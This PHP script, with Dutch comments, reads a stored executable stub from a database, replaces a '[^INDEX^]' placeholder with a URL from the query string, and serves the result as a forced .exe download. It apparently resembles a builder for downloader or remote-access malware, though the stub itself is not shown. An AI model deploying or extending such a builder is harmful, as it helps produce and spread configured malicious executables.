<?php
require_once('includes/connect.inc.php');

	$db;

     $db = new Connection();
     $db = $db->dbConnect();

	
		$new_File_output = str_replace(".exe.exe",".exe",$_GET['name'].'.exe');
		$string_Replace = $_GET['url'];

		$hexfile = "";

	    $query = $db->prepare("SELECT * FROM stub");
        $query->execute();
		
		while($row = $query->fetch(PDO::FETCH_ASSOC))
		{
			$hexfile = $row['app_hex'];
		}

		$raw_File_Array = array();

		for($i =0; $i < (strlen($hexfile));$i+=2)
		{
			$raw_File_Array[] = $hexfile[$i].$hexfile[$i+1];
		}

		$raw_File_Length = count($raw_File_Array);

		//find het begin van de string [^INDEX^]
		$raw_File_start_index = 0;
		for($temp_index = 0; $temp_index<$raw_File_Length;$temp_index++)
		{
		 $temp_hex_str_part = "";
		 for($add_index = 0; $add_index <= 16; $add_index++)
		 {
		  if($temp_index+$add_index < $raw_File_Length){
		   $temp_hex_str_part.= $raw_File_Array[$temp_index+$add_index];
		  }

		 }
		 //als de string [^INDEX^] is gevonden set hij de $raw_File_start_index naar $temp_index
		 //$temp_index is de index van de loop 
		 if($temp_hex_str_part == "5b005e0049004e004400450058005e005d")
		 {
			 $raw_File_start_index = $temp_index;
		  break;
		 }
		}

		//replace [^INDEX^] met ^^^^^^^^^
		for($temp_index = 0;$temp_index <= 16;$temp_index+=2)
		{
		 // \x05e = ^
			$raw_File_Array[$raw_File_start_index + $temp_index] = "5e";
		}


		//replace ^^^^ etc. met de $string_Replace string
		$temp_index_2 = 0;
		for($string_index = 0; $string_index < strlen($string_Replace); $string_index++)
		{
		 $raw_File_Array[$raw_File_start_index+$temp_index_2] = bin2hex($string_Replace[$string_index]);
		 $temp_index_2+=2;
		}


		$bin_array = array();
		$debug_index_ = 0;
		foreach($raw_File_Array as $Hex)
		{
			$temp_char =  hex2bin($Hex);
			$bin_array[] =  $temp_char ;
			 //debug
		   // echo "<a title=\"".$debug_index_." $Hex\">".$temp_char."</a>";
			$debug_index_++;
		}

		$newfile = implode("",$bin_array);

		//file_put_contents($new_File_output,$newfile);

		header('Expires: Thu, 01-Jan-70 00:00:01 GMT');
		header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
		header('Cache-Control: no-store, no-cache, must-revalidate');
		header('Cache-Control: post-check=0, pre-check=0', false);
		header('Pragma: no-cache');

		header("Content-Type: application/octet-stream");
		header("Content-Type: application/download");
		header("Content-Description: File Transfer");  
		header('Content-Disposition: attachment; filename='.urlencode($new_File_output));
		header("Content-Type: application/force-download");
		echo $newfile;
		
		/*
		function hex2bin($hexstr) 
    { 
        $n = strlen($hexstr); 
        $sbin="";   
        $i=0; 
        while($i<$n) 
        {       
            $a =substr($hexstr,$i,2);           
            $c = pack("H*",$a); 
            if ($i==0){$sbin=$c;} 
            else {$sbin.=$c;} 
            $i+=2; 
        } 
        return $sbin; 
    } 
	}*/

?>